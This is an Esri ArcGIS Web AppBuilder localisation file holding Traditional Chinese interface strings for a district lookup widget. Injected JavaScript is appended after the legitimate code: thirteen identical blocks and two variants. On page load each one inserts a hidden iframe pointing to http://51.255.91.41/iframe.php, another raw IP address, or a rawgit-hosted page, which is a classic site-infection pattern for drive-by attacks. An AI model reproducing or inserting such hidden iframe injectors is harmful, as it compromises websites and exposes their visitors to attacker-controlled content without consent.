// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"\u82f1\u91cc",kilometers:"\u516c\u91cc",feet:"\u82f1\u544e",meters:"\u516c\u5c3a"},layerSetting:{layerSettingTabTitle:"\u641c\u5c0b\u8a2d\u5b9a",buttonSet:"\u8a2d\u5b9a",selectLayersLabel:"\u9078\u64c7\u5716\u5c64",selectLayersHintText:"\u63d0\u793a: \u7528\u4f86\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64\u53ca\u5176\u76f8\u95dc\u9ede\u5716\u5c64\u3002",selectPrecinctSymbolLabel:"\u9078\u64c7\u7b26\u865f\u4ee5\u7a81\u986f\u591a\u908a\u5f62",
selectGraphicLocationSymbol:"\u5730\u5740\u6216\u4f4d\u7f6e\u7b26\u865f",graphicLocationSymbolHintText:"\u63d0\u793a: \u641c\u5c0b\u7684\u5730\u5740\u6216\u6309\u4e00\u4e0b\u7684\u4f4d\u7f6e\u6240\u9069\u7528\u7684\u7b26\u865f",precinctSymbolHintText:"\u63d0\u793a: \u7528\u4f86\u986f\u793a\u6240\u9078\u591a\u908a\u5f62\u7684\u7b26\u865f",selectColorForPoint:"\u9078\u64c7\u984f\u8272\u4ee5\u7a81\u986f\u9ede",selectColorForPointHintText:"\u63d0\u793a: \u7528\u4f86\u986f\u793a\u6240\u9078\u9ede\u7684\u5f37\u8abf\u984f\u8272"},
searchSourceSetting:{searchSourceSettingTabTitle:"\u641c\u5c0b\u4f86\u6e90\u8a2d\u5b9a",searchSourceSettingTitle:"\u641c\u5c0b\u4f86\u6e90\u8a2d\u5b9a",searchSourceSettingTitleHintText:"\u65b0\u589e\u4e26\u914d\u7f6e\u5730\u7406\u7de8\u78bc\u670d\u52d9\u6216\u5716\u5fb5\u5716\u5c64\u70ba\u641c\u5c0b\u4f86\u6e90\u3002\u9019\u4e9b\u6307\u5b9a\u7684\u4f86\u6e90\u6c7a\u5b9a\u4e86\u641c\u5c0b\u65b9\u584a\u4e2d\u7684\u53ef\u641c\u5c0b\u5167\u5bb9",addSearchSourceLabel:"\u65b0\u589e\u641c\u5c0b\u4f86\u6e90",
featureLayerLabel:"\u5716\u5fb5\u5716\u5c64",geocoderLabel:"\u5730\u7406\u7de8\u78bc\u5668",nameTitle:"\u540d\u7a31",generalSettingLabel:"\u4e00\u822c\u8a2d\u5b9a",allPlaceholderLabel:"\u7528\u65bc\u5168\u90e8\u641c\u5c0b\u7684\u5360\u4f4d\u7b26\u6587\u5b57:",allPlaceholderHintText:"\u63d0\u793a: \u8f38\u5165\u5728\u641c\u5c0b\u6240\u6709\u5716\u5c64\u548c\u5730\u7406\u7de8\u78bc\u5668\u6642\uff0c\u8981\u986f\u793a\u6210\u4f54\u4f4d\u7b26\u7684\u6587\u5b57",generalSettingCheckboxLabel:"\u986f\u793a\u767c\u73fe\u7684\u5716\u5fb5\u6216\u4f4d\u7f6e\u7684\u5feb\u986f\u8996\u7a97",
countryCode:"\u570b\u78bc\u6216\u5730\u5340\u4ee3\u78bc",countryCodeEg:"\u4f8b\u5982 ",countryCodeHint:"\u7559\u7a7a\u6b64\u503c\u6703\u641c\u5c0b\u6240\u6709\u570b\u5bb6\u548c\u5730\u5340",questionMark:"?",searchInCurrentMapExtent:"\u50c5\u5728\u76ee\u524d\u7684\u5730\u5716\u7bc4\u570d\u4e2d\u641c\u5c0b",zoomScale:"\u7e2e\u653e\u6bd4\u4f8b",locatorUrl:"\u5730\u7406\u7de8\u78bc\u5668 URL",locatorName:"\u5730\u7406\u7de8\u78bc\u5668\u540d\u7a31",locatorExample:"\u7bc4\u4f8b",locatorWarning:"\u4e0d\u652f\u63f4\u6b64\u7248\u672c\u7684\u5730\u7406\u7de8\u78bc\u670d\u52d9\u3002\u8a72 widget\u652f\u63f4 10.0 \u53ca\u66f4\u9ad8\u7248\u672c\u7684\u5730\u7406\u7de8\u78bc\u670d\u52d9\u3002",
locatorTips:"\u7531\u65bc\u5730\u7406\u7de8\u78bc\u670d\u52d9\u4e0d\u652f\u63f4\u5efa\u8b70\u529f\u80fd\uff0c\u56e0\u6b64\u5efa\u8b70\u7121\u6cd5\u4f7f\u7528\u3002",layerSource:"\u5716\u5c64\u4f86\u6e90",setLayerSource:"\u8a2d\u5b9a\u5716\u5c64\u4f86\u6e90",setGeocoderURL:"\u8a2d\u5b9a\u5730\u7406\u7de8\u78bc\u5668 URL",searchLayerTips:"\u7531\u65bc\u5716\u5fb5\u670d\u52d9\u4e0d\u652f\u63f4\u5206\u9801\u529f\u80fd\uff0c\u56e0\u6b64\u5efa\u8b70\u7121\u6cd5\u4f7f\u7528\u3002",placeholder:"\u4f54\u4f4d\u7b26\u6587\u5b57",
searchFields:"\u641c\u5c0b\u6b04\u4f4d",displayField:"\u986f\u793a\u6b04\u4f4d",exactMatch:"\u5b8c\u5168\u76f8\u7b26",maxSuggestions:"\u6700\u5927\u5efa\u8b70\u6578",maxResults:"\u6700\u5927\u7d50\u679c\u6578",enableLocalSearch:"\u555f\u7528\u672c\u6a5f\u641c\u5c0b",minScale:"\u6700\u5c0f\u6bd4\u4f8b",minScaleHint:"\u7576\u5730\u5716\u6bd4\u4f8b\u5927\u65bc\u6b64\u6bd4\u4f8b\u6642\uff0c\u5c07\u5957\u7528\u672c\u6a5f\u641c\u5c0b",radius:"\u534a\u5f91",radiusHint:"\u6307\u5b9a\u76ee\u524d\u5730\u5716\u4e2d\u5fc3\u5468\u570d\u7684\u5340\u57df\u534a\u5f91\uff0c\u53ef\u7528\u4f86\u63d0\u5347\u5730\u7406\u7de8\u78bc\u5019\u9078\u8005\u7684\u7b49\u7d1a\uff0c\u4ee5\u512a\u5148\u50b3\u56de\u96e2\u4f4d\u7f6e\u6700\u8fd1\u7684\u5019\u9078\u8005",
meters:"\u516c\u5c3a",setSearchFields:"\u8a2d\u5b9a\u641c\u5c0b\u6b04\u4f4d",set:"\u8a2d\u5b9a",fieldName:"\u540d\u7a31",invalidUrlTip:"URL ${URL} \u7121\u6548\u6216\u4e0d\u53ef\u5b58\u53d6\u3002",invalidSearchSources:"\u641c\u5c0b\u4f86\u6e90\u8a2d\u5b9a\u7121\u6548"},layerSelector:{selectPolygonLayerLabel:"\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64",selectPolygonLayerHintText:"\u63d0\u793a: \u7528\u4f86\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64\u3002",selectRelatedPointLayerLabel:"\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64\u76f8\u95dc\u7684\u9ede\u5716\u5c64",
selectRelatedPointLayerHintText:"\u63d0\u793a: \u7528\u4f86\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64\u76f8\u95dc\u7684\u9ede\u5716\u5c64",polygonLayerNotHavingRelatedLayer:"\u8acb\u9078\u64c7\u5177\u6709\u76f8\u95dc\u9ede\u5716\u5c64\u7684\u591a\u908a\u5f62\u5716\u5c64\u3002",errorInSelectingPolygonLayer:"\u8acb\u9078\u64c7\u5177\u6709\u76f8\u95dc\u9ede\u5716\u5c64\u7684\u591a\u908a\u5f62\u5716\u5c64\u3002",errorInSelectingRelatedLayer:"\u8acb\u9078\u64c7\u591a\u908a\u5f62\u5716\u5c64\u76f8\u95dc\u7684\u9ede\u5716\u5c64\u3002"},
routeSetting:{routeSettingTabTitle:"\u65b9\u5411\u8a2d\u5b9a",routeServiceUrl:"\u8def\u7dda\u898f\u5283\u670d\u52d9",buttonSet:"\u8a2d\u5b9a",routeServiceUrlHintText:"\u63d0\u793a: \u6309\u4e00\u4e0b\u300c\u8a2d\u5b9a\u300d\u4ee5\u700f\u89bd\u548c\u9078\u64c7\u7db2\u8def\u5206\u6790\u8def\u7dda\u898f\u5283\u670d\u52d9",directionLengthUnit:"\u65b9\u5411\u9577\u5ea6\u55ae\u4f4d",unitsForRouteHintText:"\u63d0\u793a: \u7528\u4f86\u986f\u793a\u8def\u7dda\u7684\u5831\u544a\u55ae\u4f4d",selectRouteSymbol:"\u9078\u64c7\u8981\u986f\u793a\u8def\u7dda\u7684\u7b26\u865f",
routeSymbolHintText:"\u63d0\u793a: \u7528\u4f86\u986f\u793a\u8def\u7dda\u7684\u7dda\u689d\u7b26\u865f",routingDisabledMsg:"\u82e5\u8981\u555f\u7528\u65b9\u5411\uff0c\u8acb\u78ba\u5b9a\u5728 ArcGIS Online \u9805\u76ee\u4e2d\u555f\u7528\u8def\u7dda\u898f\u5283\u3002"},networkServiceChooser:{arcgislabel:"\u5f9e ArcGIS Online \u65b0\u589e",serviceURLabel:"\u65b0\u589e\u670d\u52d9 URL",routeURL:"\u8def\u5f91 URL",validateRouteURL:"\u9a57\u8b49",exampleText:"\u7bc4\u4f8b",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",
hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"\u8acb\u6307\u5b9a\u6709\u6548\u7684\u8def\u7dda\u670d\u52d9\u3002",rateLimitExceeded:"\u5df2\u8d85\u904e\u6bd4\u7387\u9650\u5236\u3002\u8acb\u7a0d\u5f8c\u518d\u8a66\u3002",errorInvokingService:"\u4f7f\u7528\u8005\u540d\u7a31\u6216\u5bc6\u78bc\u4e0d\u6b63\u78ba\u3002"},symbolPickerPreviewText:"\u9810\u89bd:",showToolToSelectLabel:"\u8a2d\u5b9a\u4f4d\u7f6e\u6309\u9215",showToolToSelectHintText:"\u63d0\u793a: \u6309\u4e00\u4e0b\u5730\u5716\u6642\u63d0\u4f9b\u6309\u9215\u4ee5\u8a2d\u5b9a\u5730\u5716\u4e0a\u7684\u4f4d\u7f6e\uff0c\u800c\u975e\u4e00\u5f8b\u8a2d\u5b9a\u4f4d\u7f6e",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});